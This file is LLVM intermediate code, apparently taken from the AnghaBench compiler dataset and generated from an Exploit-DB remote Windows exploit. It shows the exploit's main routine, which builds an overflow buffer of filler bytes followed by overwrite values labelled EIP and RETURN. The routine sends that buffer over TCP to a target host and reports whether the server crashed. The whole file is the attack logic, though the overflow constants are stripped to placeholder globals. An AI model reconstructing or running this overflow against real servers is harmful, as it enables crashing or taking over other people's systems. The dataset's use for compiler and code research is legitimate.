; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_21542.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_21542.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32, %struct.in_addr }
%struct.in_addr = type { i64 }
%struct.hostent = type { i64 }
%struct.sockaddr = type { i32 }

@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [19 x i8] c"\0AUsage: %s <host>\0A\00", align 1
@BUFFSIZE = common dso_local global i32 0, align 4
@INADDR_NONE = common dso_local global i64 0, align 8
@PORT = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@CHZ = common dso_local global i32 0, align 4
@OFFSET = common dso_local global i32 0, align 4
@EIP = common dso_local global i32 0, align 4
@RETURN = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [18 x i8] c"\0AServer crashed!\0A\00", align 1
@.str.2 = private unnamed_addr constant [27 x i8] c"\0AServer is not vulnerable\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca %struct.sockaddr_in, align 8
  %9 = alloca %struct.hostent*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = load i32, i32* @stdout, align 4
  %14 = call i32 @setbuf(i32 %13, i32* null)
  %15 = load i32, i32* %4, align 4
  %16 = icmp slt i32 %15, 2
  br i1 %16, label %17, label %23

17:                                               ; preds = %2
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str, i64 0, i64 0), i8* %20)
  %22 = call i32 @exit(i32 1) #5
  unreachable

23:                                               ; preds = %2
  %24 = load i32, i32* @BUFFSIZE, align 4
  %25 = zext i32 %24 to i64
  %26 = call i8* @llvm.stacksave()
  store i8* %26, i8** %6, align 8
  %27 = alloca i8, i64 %25, align 16
  store i64 %25, i64* %7, align 8
  %28 = call i32 @MAKEWORD(i32 2, i32 0)
  %29 = call i32 @WSAStartup(i32 %28, i32* %12)
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 1
  %32 = load i8*, i8** %31, align 8
  %33 = call i64 @inet_addr(i8* %32)
  %34 = load i64, i64* @INADDR_NONE, align 8
  %35 = icmp eq i64 %33, %34
  br i1 %35, label %36, label %54

36:                                               ; preds = %23
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 1
  %39 = load i8*, i8** %38, align 8
  %40 = call %struct.hostent* @gethostbyname(i8* %39)
  store %struct.hostent* %40, %struct.hostent** %9, align 8
  %41 = load %struct.hostent*, %struct.hostent** %9, align 8
  %42 = icmp eq %struct.hostent* %41, null
  br i1 %42, label %43, label %45

43:                                               ; preds = %36
  %44 = call i32 @sock_err(i32 -1)
  br label %53

45:                                               ; preds = %36
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %47 = load %struct.hostent*, %struct.hostent** %9, align 8
  %48 = getelementptr inbounds %struct.hostent, %struct.hostent* %47, i32 0, i32 0
  %49 = load i64, i64* %48, align 8
  %50 = inttoptr i64 %49 to %struct.in_addr*
  %51 = bitcast %struct.in_addr* %46 to i8*
  %52 = bitcast %struct.in_addr* %50 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 8 %51, i8* align 8 %52, i64 8, i1 false)
  br label %53

53:                                               ; preds = %45, %43
  br label %61

54:                                               ; preds = %23
  %55 = load i8**, i8*** %5, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 1
  %57 = load i8*, i8** %56, align 8
  %58 = call i64 @inet_addr(i8* %57)
  %59 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %60 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %59, i32 0, i32 0
  store i64 %58, i64* %60, align 8
  br label %61

61:                                               ; preds = %54, %53
  %62 = load i32, i32* @PORT, align 4
  %63 = call i32 @htons(i32 %62)
  %64 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i32 %63, i32* %64, align 4
  %65 = load i32, i32* @AF_INET, align 4
  %66 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i32 %65, i32* %66, align 8
  %67 = load i32, i32* @CHZ, align 4
  %68 = load i32, i32* @OFFSET, align 4
  %69 = call i32 @memset(i8* %27, i32 %67, i32 %68)
  %70 = load i32, i32* @OFFSET, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds i8, i8* %27, i64 %71
  %73 = load i32, i32* @EIP, align 4
  %74 = call i32 @memcpy(i8* %72, i32 %73, i32 4)
  %75 = load i32, i32* @OFFSET, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8, i8* %27, i64 %76
  %78 = getelementptr inbounds i8, i8* %77, i64 4
  %79 = load i32, i32* @RETURN, align 4
  %80 = call i32 @memcpy(i8* %78, i32 %79, i32 4)
  %81 = load i32, i32* @AF_INET, align 4
  %82 = load i32, i32* @SOCK_STREAM, align 4
  %83 = load i32, i32* @IPPROTO_TCP, align 4
  %84 = call i32 @socket(i32 %81, i32 %82, i32 %83)
  store i32 %84, i32* %10, align 4
  %85 = load i32, i32* %10, align 4
  %86 = call i32 @sock_err(i32 %85)
  %87 = load i32, i32* %10, align 4
  %88 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %89 = call i32 @connect(i32 %87, %struct.sockaddr* %88, i32 16)
  store i32 %89, i32* %11, align 4
  %90 = load i32, i32* %11, align 4
  %91 = call i32 @sock_err(i32 %90)
  %92 = load i32, i32* %10, align 4
  %93 = load i32, i32* @BUFFSIZE, align 4
  %94 = call i32 @send(i32 %92, i8* %27, i32 %93, i32 0)
  store i32 %94, i32* %11, align 4
  %95 = load i32, i32* %11, align 4
  %96 = call i32 @sock_err(i32 %95)
  %97 = load i32, i32* %10, align 4
  %98 = load i32, i32* @BUFFSIZE, align 4
  %99 = call i32 @recv(i32 %97, i8* %27, i32 %98, i32 0)
  store i32 %99, i32* %11, align 4
  %100 = load i32, i32* %11, align 4
  %101 = icmp slt i32 %100, 0
  br i1 %101, label %102, label %104

102:                                              ; preds = %61
  %103 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.1, i64 0, i64 0))
  br label %106

104:                                              ; preds = %61
  %105 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.2, i64 0, i64 0))
  br label %106

106:                                              ; preds = %104, %102
  %107 = load i32, i32* %10, align 4
  %108 = call i32 @closesocket(i32 %107)
  %109 = call i32 (...) @WSACleanup()
  store i32 0, i32* %3, align 4
  %110 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %110)
  %111 = load i32, i32* %3, align 4
  ret i32 %111
}

declare dso_local i32 @setbuf(i32, i32*) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

declare dso_local i32 @WSAStartup(i32, i32*) #1

declare dso_local i32 @MAKEWORD(i32, i32) #1

declare dso_local i64 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @sock_err(i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #4

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @closesocket(i32) #1

declare dso_local i32 @WSACleanup(...) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { argmemonly nounwind willreturn }
attributes #5 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
